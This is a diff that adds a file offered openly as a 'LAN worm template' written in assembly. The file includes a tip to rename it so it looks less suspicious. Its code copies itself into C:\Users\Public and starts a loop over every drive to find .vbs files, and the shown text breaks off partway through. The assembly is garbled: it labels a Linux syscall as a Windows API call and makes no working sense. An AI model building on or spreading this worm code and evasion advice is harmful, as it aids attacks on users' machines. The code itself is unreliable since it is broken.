@@ -1,0 +1,29 @@
+This is the LAN worm template in Assembly, it will rename itself to worm.exe so 
+change the code to make the file not name itself that, cuz that suspicious:
+
+section .data
+    fileName db "worm.exe", 0
+    cmd db "cmd.exe /c copy /Y worm.exe C:\Users\Public", 0
+section .text
+    global _start
+
+_start:
+    mov eax, 0x40 ; call GetLogicalDriveStrings
+    mov ebx, 0x100
+    push ebx
+    lea ebx, [esp+4]
+    int 0x80
+
+    ; loop through all logical drives and search for .vbs files
+    xor ecx, ecx
+    loop:
+        mov edx, ebx
+        inc ecx
+        cmp byte [edx], 0
+        je finish
+        call searchFiles
+        add ebx, 0x100
+        jmp loop
+
+searchFiles:
+    push edx ; save pointer to logical drive
